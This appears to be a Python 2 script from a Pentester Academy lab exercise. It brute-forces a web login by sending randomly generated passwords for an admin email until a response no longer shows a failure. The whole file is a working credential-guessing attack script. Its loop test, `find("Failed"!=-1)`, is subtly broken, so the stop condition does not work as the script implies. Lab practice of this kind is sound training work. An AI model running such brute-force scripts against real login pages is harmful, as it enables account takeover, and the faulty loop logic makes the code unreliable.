
from bs4 import BeautifulSoup
import urllib
import random
import time

data = []

def id_generator(size=5, chars="xyz"):
    return ''.join(random.choice(chars) for x in range(size))

def nextPass():
	password = id_generator()
	while password in data:
		password = id_generator()
	data.append(password)
	return password

baseURL = "http://pentesteracademylab.appspot.com/lab/webapp/1"
user = "admin@pentesteracademy.com"
args = {"email":user, "password": nextPass()}

encodeArgs = urllib.urlencode(args)
httpResponse=urllib.urlopen(baseURL+"?"+encodeArgs)

bt = BeautifulSoup(httpResponse.read())

while bt.div.p.b.find("Failed"!=-1) :
	time.sleep(1)
	#print "login failed for "+str(args)
	
	args = {"email":user, "password": nextPass()}
	encodeArgs = urllib.urlencode(args)
	httpResponse=urllib.urlopen(baseURL+"?"+encodeArgs)

	bt = BeautifulSoup(httpResponse.read())

print "Login successfull: %s" %(str(encodeArgs))